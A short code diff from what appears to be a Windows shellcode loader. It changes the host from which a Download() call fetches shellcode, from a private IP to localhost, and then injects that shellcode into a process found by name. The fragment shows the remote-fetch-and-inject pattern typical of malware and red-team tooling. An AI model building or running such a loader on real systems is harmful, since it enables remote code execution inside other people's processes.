@@ -44,7 +44,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdParam
 
 	std::string args(szCmdParam);
 
-	Shellcode shellcode = Download(L"192.168.100.12", 80);
+	Shellcode shellcode = Download(L"localhost", 80);
 	DWORD pTarget = ProcessIdByName(processName);
 	Execute(shellcode, pTarget);
 
